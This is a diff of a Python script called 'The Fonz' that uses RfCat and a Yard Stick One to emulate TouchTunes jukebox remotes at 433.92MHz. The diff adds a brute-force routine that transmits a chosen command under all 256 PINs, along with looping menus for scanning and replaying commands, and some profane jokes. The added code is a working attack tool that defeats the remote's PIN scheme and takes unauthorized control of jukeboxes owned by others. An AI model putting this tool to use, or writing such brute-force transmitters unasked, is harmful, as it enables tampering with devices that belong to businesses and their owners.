@@ -1,6 +1,6 @@
 #!/usr/bin/python
 #
-#The Fonz, a friendly passive scanner for finding out which pin is being used for a TouchTunes (Gen 2 and above) wireless remote.
+#The Fonz, a friendly TouchTunes Remote imulation tool used for finding PIN's, brute forcing, and genural jukebox control.
 #TouchTunes remotes TX at 433.92Mhz, uses ASK/OOK and uses a pin (000-255) for "security". 
 #This script was meant to be used with RfCat and the Yard Stick One.
 
@@ -27,26 +27,24 @@ from rflib import *
 import datetime
 import time
 import sys
+import os
 
 
 banner = """    _____ _            _____               
    |_   _| |__   ___  |  ___|__  _ __  ____
      | | | '_ \ / _ \ | |_ / _ \| '_ \|_  /
      | | | | | |  __/ |  _| (_) | | | |/ / 
-     |_| |_| |_|\___| |_|  \___/|_| |_/___| V0.3
+     |_| |_| |_|\___| |_|  \___/|_| |_/___| V0.4
 
 "Arthur, it's morning, have you been here all night?"
               Slect a number to begin!\n"""
 
-mainmenu = ''' -=Main Menu=-
-1.) Scan
-2.) TX
-3.) Exit \n'''
+
 
 ###the ID Vender and ID Product of the YSO, used to restart if libusb fails
 ##from usb.core import find as finddev
 ##dev = finddev(idVendor=0x1d50, idProduct=0x605b)
-##dev.reset() 
+##dev.reset()
 
 
 #The D lol
@@ -181,10 +179,10 @@ def Scan(d):
         d.setMdmSyncMode(2)
         d.setMdmSyncWord(0x0000ffff) #FFFF is the beging of the preamble and won't be displayed, rflib assumes you know it's there when you set this variable.
         d.setMdmNumPreamble(0)
-        d.setMaxPower()
         d.makePktFLEN(16)
 
         print "-=Hit <ENTER> to stop=-"
+        #while True:
         while not keystop():
                 pkt, ts = d.RFrecv() #RX packet and timestamp
                 try:
@@ -197,98 +195,10 @@ def Scan(d):
 
                 except ChipconUsbTimeoutException:
                         pass
+        null = raw_input() #Nulls enter for when you keystop, More of my bad scripting lol
+        MainMenu()
 
 
-#makes a reveresed list of commands and refrences it to the user's choice
-def TxMenu():
-        pin = PinsAnsMenu()
-        command = CommandAnsMenu()
-        repeat = TimesAnsMenu()
-
-        FullCommand = 'ffff00a2888a2'+pin+command
-        ##CommandEncode = "".join('\\x' + FullCommand[i:i+2] for i in xrange(0,len(FullCommand),2)) # Str Hex to Encoded Hex, Thans jeek! :D
-        #CommandEncode = FullCommand.decode('hex')
-        
-        print "\nWARNING! YOU'RE ABOUT TO DO SOME COOL THINGS!"
-        TxAns = raw_input("Are you cool like the Fonz to TX '"+FullCommand+"', '"+KeyButton+"' "+repeat+" times's? [Y/N]:")
-        if str.lower(TxAns) == 'n':
-                MainMenu()
-        elif str.lower(TxAns) == 'y':
-                print '\nTXing...\n'
-                TX(FullCommand.decode('hex'), int(repeat)) #Dose the thing with the radio thin
-                MainMenu()
-        elif TxAns != '':
-                print "\nNaw, you don goofed so you're not that cool... Please try again thou! :D"
-                sys.exit()
-
-
-
-def PinsAnsMenu():
-        pin = 0
-        try:
-                PinAns=raw_input("Which PIN do you want to use? [000-255]: ")
-                if int(PinAns) >= 256:
-                        print "\n Not a valid choice, please try again... \n"
-                        time.sleep(.5)
-                        PinsAnsMenu()                        
-                elif int(PinAns) >= 0 and int(PinAns) <= 255:
-                        pin = nukecodes[int(PinAns)]
-                        global Wcommand
-                        Wcommand = WhichCommand[int(PinAns)] #choses between the 2 posable commands
-                        return pin
-        except ValueError:
-                print "\n Not a valid choice, please try again... \n"
-                time.sleep(.5)
-                PinsAnsMenu()
-       
-
-
-def CommandAnsMenu():
-        global KeyButton
-        items = commands.keys()
-        items.sort(reverse=1) #anti-alphabetical order
-        choice = 0
-        for button in items:
-                choice +=1
-                print '%i.) %s' %(choice, button)
-        print '%i.) Back \n' %(choice+1)
-        try:
-                CommandAns=raw_input('Pick a command. Select [1-%i]: ' %(choice+1))
-                if int(CommandAns) > choice+1 or int(CommandAns) <=0:
-                        print "\n Not a valid choice, please try again... \n"
-                        time.sleep(.5)
-                        CommandAnsMenu()                        
-                elif int(CommandAns) == choice+1:
-                        MainMenu()
-                elif int(CommandAns) >= 1 and int(CommandAns) <= choice:
-                        KeyButton = items[int(CommandAns)-1] #the chosen command in the items list
-                        value = commands[str(KeyButton)]
-                        command = value[Wcommand]
-                        return command
-        except ValueError:
-                print "\n Not a valid choice, please try again... \n"
-                time.sleep(.5)
-                CommandAnsMenu()
-        
-
-
-def TimesAnsMenu():
-        try:       
-                TimesAns=raw_input("Repeat how many times? [1-65535]: ")
-                if int(TimesAns) >= 65536 or int(TimesAns) <=0:
-                        print "\n Not a valid choice, please try again... \n"
-                        time.sleep(.5)
-                        TimesAnsMenu()                        
-                elif int(TimesAns) >= 1 and int(TimesAns) <= 65535:
-                                times = int(TimesAns)
-                                return str(times)
-        except ValueError:
-                print "\n Not a valid choice, please try again... \n"
-                time.sleep(.5)
-                TimesAnsMenu()
-
-
-                
 def TX(data, repeat):
         d.setFreq(433.92e6)
         d.setMdmModulation(MOD_ASK_OOK)
@@ -298,23 +208,221 @@ def TX(data, repeat):
         d.setMaxPower()
         d.RFxmit(data, repeat)
 
-        
+
+#Trys every PIN for a command
+def BruteForceThisMotherFucker():
+
+        items = commands.keys()
+        items.sort(reverse=1) #anti-alphabetical order
+        choice = 0
+        for button in items:
+                choice +=1
+                print '%i.) %s' %(choice, button)
+        print '%i.) Back \n' %(choice+1)
+        loop = True
+        while loop:
+                try:
+                        CommandAns=raw_input('Pick a command. Select [1-%i]: ' %(choice+1))
+                        if int(CommandAns) <= choice and int(CommandAns) >= 1:
+                                KeyButton = items[int(CommandAns)-1] #the chosen command in the items list
+                                value = commands[str(KeyButton)]
+                                CommandZero = value[0]
+                                CommandOne = value[1]
+                                loop = False                                
+                        elif int(CommandAns) == choice+1:
+                                loop = False
+                                MainMenu()
+                        else:
+                                print "Not a valid choice, please try again... \n"
+                                time.sleep(.5)                                
+                except ValueError:
+                        print "Not a valid choice, please try again... \n"
+                        time.sleep(.5)
+                        pass
+
+        loop2 = True
+        while loop2:
+                print "\n<*> WARNING! YOU'RE ABOUT TO DO SOME COOL THINGS!"
+                TxAns = raw_input("Are you cool like the Fonz to brute force this thing? [Y/N]:")
+                if str.lower(TxAns) == 'n':
+                        loop2 = False
+                        MainMenu()
+                elif str.lower(TxAns) == 'y':
+                        os.system('clear')
+                        print "\n\"What day is today?\" asked Pooh"
+                        time.sleep(1)
+                        print "\"It's the day we burn this motherfucker to the ground.\" squeaked Piglet"
+                        time.sleep(2)
+                        print "\"My favorite day.\" said Pooh\n"
+                        time.sleep(1.5)
+                        print "<*> BRUTE FORCE IN PROGRESS..."
+
+                        start = int(time.time())
+                        PinCounter = 0
+                        for pin in nukecodes:
+                                if WhichCommand[PinCounter] == 0:
+                                        BruteCommand = CommandZero
+                                else:
+                                        BruteCommand = CommandOne
+                                FullCommand = 'ffff00a2888a2'+pin+BruteCommand
+                                if len(FullCommand) % 2 != 0: #Makes sure things are even
+                                        FullCommand = FullCommand+'0'
+                                TX(FullCommand.decode('hex'), 1)
+                                PinCounter +=1
+                        stop = int(time.time())
+                        TotalTime = stop-start
+                        print "<*> BRUTE FORCE COMPLETE! TIME: %isec\n" %(TotalTime)
+                        loop2 = False
+                        MainMenu()
+                else:
+                        print "\nNaw, you don goofed and you're not cool... Please try again thou! :D"
+                        sys.exit()
+
+                        
+
 def MainMenu():
-        print mainmenu
-        ans=raw_input('Select [1-3]: ')
-        if ans == "1":
-                Scan(d)
-        elif ans == "2":
-                TxMenu()
-        elif ans == "3":
-                sys.exit()
-        elif ans != "":
-                print "\n Not a valid choice, please try again... \n"
-                time.sleep(.5)
+        mainmenu = ''' -=Main Menu=-
+1.) Scan
+2.) TX
+3.) Exit \n'''
+
+        print mainmenu        
+        loop = True
+        while loop:
+                try:
+                        MenuAns=raw_input('Select [1-3]: ')
+                        if int(MenuAns) == 1:
+                                loop = False                                
+                                Scan(d)
+                        elif int(MenuAns) == 2:
+                                loop = False
+                                TxMenu()
+                        elif int(MenuAns) == 3:
+                                sys.exit()
+                        else: 
+                                print "Not a valid choice, please try again... \n"
+                                time.sleep(.5)
+                                
+                except ValueError:
+                        print "Not a valid choice, please try again... \n"
+                        time.sleep(.5)
+                        pass
+
+
+#makes a reveresed list of commands and refrences it to the user's choice
+def TxMenu():
+        pin = PinMenu()
+        if pin == 999:
+                BruteForceThisMotherFucker()
                 MainMenu()
+        command = CommandMenu()
+        repeat = TimesMenu()
+
+        FullCommand = 'ffff00a2888a2'+pin+command
+        if len(FullCommand) % 2 != 0: #Makes sure string is even
+                FullCommand = FullCommand+'0'
+
+        loop = True
+        while loop:
+                print "\n<*> WARNING! YOU'RE ABOUT TO DO SOME COOL THINGS!"
+                TxAns = raw_input("Are you cool like the Fonz to TX '"+FullCommand+"', '"+KeyButton+"' "+repeat+" times's? [Y/N]:")
+                if str.lower(TxAns) == 'n':
+                        loop = 0
+                        MainMenu()
+                elif str.lower(TxAns) == 'y':
+                        Tx = True
+                        while Tx:
+                                print '<*> TXing...\n'
+                                TX(FullCommand.decode('hex'), int(repeat)) #Dose the thing with the radio thin
+                                ReTransmit = raw_input("TX Again? [Y/N]")
+                                if str.lower(ReTransmit) == 'n':
+                                        Tx = False
+                                        MainMenu()
+                                elif str.lower(ReTransmit) == 'y':
+                                        Tx = True
+                                else:
+                                        Tx = False
+                                        MainMenu()
+                else:
+                        print "\nNaw, you don goofed and you're not cool... Please try again thou! :D"
+                        sys.exit()
 
 
 
+def PinMenu():
+        loop = True
+        while loop:
+                try:
+                        PinAns=raw_input("Which PIN do you want to use? [000-255] [999 to Brute Force]: ")
+                        if int(PinAns) <=255:
+                                pin = nukecodes[int(PinAns)]
+                                global Wcommand
+                                Wcommand = WhichCommand[int(PinAns)] #choses between the 2 posable commands
+                                loop = False
+                                return pin
+                        elif int(PinAns) == 999:
+                                return int(PinAns)
+                        else:
+                                print "Not a valid choice, please try again... \n"
+                                time.sleep(.5)     
+                except ValueError:
+                        print "Not a valid choice, please try again... \n"
+                        time.sleep(.5)
+                        pass
+
+
+def CommandMenu():
+        global KeyButton
+        items = commands.keys()
+        items.sort(reverse=1) #anti-alphabetical order
+        choice = 0
+        for button in items:
+                choice +=1
+                print '%i.) %s' %(choice, button)
+        print '%i.) Back \n' %(choice+1)
+        loop = True
+        while loop:
+                try:
+                        CommandAns=raw_input('Pick a command. Select [1-%i]: ' %(choice+1))
+                        if int(CommandAns) <= choice and int(CommandAns) >= 1:
+                                KeyButton = items[int(CommandAns)-1] #the chosen command in the items list
+                                value = commands[str(KeyButton)]
+                                command = value[Wcommand]
+                                loop = False
+                                return command
+                        elif int(CommandAns) == choice+1:
+                                loop = False
+                                MainMenu()
+                        else:
+                                print "Not a valid choice, please try again... \n"
+                                time.sleep(.5)                                
+                except ValueError:
+                        print "Not a valid choice, please try again... \n"
+                        time.sleep(.5)
+                        pass
+        
+
+
+def TimesMenu():
+        loop = True
+        while loop:
+                try:       
+                        TimesAns=raw_input("Repeat how many times? [1-65535]: ")
+                        if int(TimesAns) <= 65535:
+                                        times = int(TimesAns)
+                                        loop = False
+                                        return str(times)
+                        else: 
+                                print "Not a valid choice, please try again... \n"
+                                time.sleep(.5)                       
+
+                except ValueError:
+                        print "Not a valid choice, please try again... \n"
+                        time.sleep(.5)
+                        pass        
+       
+
+os.system('clear')
 print(banner)
 MainMenu()
 
